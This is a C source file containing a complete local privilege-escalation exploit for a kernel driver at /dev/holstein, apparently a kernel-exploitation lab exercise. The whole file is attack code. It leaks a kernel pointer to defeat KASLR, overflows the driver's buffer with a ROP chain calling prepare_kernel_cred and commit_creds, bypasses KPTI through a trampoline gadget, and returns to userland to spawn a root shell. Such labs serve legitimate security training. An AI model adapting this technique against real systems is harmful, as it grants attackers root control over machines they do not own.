#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <inttypes.h>
#define commit_creds (0x6e390 + leaked_address)
#define prepare_kernel_cred (0x6e240 + leaked_address)

uint64_t user_cs, user_ss, user_rsp, user_rip, user_rflags;

void get_shell() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop qword ptr [rip+user_rflags];"
        ".att_syntax"
    );
    user_rip = (uint64_t)(uintptr_t)get_shell;
}

int main() {
    
    uint64_t idx = 0;
    save_state();
    char payload[0x500];
    int fd = open("/dev/holstein", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    memset(payload, 'A', 0x500);
    read(fd, payload, 0x410);
    uint64_t leaked_address = *(uint64_t *)(payload + 0x408);
    leaked_address =  leaked_address - 0x13d33c;
    uint64_t pop_rdi = 0x27bbdc + leaked_address;
    uint64_t bypass_kpti = 0x800e26 + leaked_address;
    uint64_t pop_rcx = 0x32cdd3 + leaked_address;
    uint64_t mov_rdi_rax = 0x60c96b + leaked_address;
    printf("%llx\n", (long long unsigned)leaked_address);
    memset(payload, 'A', 0x500);
    uint64_t *rop = (uint64_t *)(payload + 0x408);
    rop[idx++] = pop_rdi;
    rop[idx++] = 0;
    rop[idx++] = prepare_kernel_cred;
    rop[idx++] = pop_rcx;
    rop[idx++] = 0;
    rop[idx++] = mov_rdi_rax;
    rop[idx++] = commit_creds;
    rop[idx++] = bypass_kpti;
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = user_rip;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_rsp;
    rop[idx++] = user_ss;
    write(fd, payload, sizeof(payload));
    return 0;
}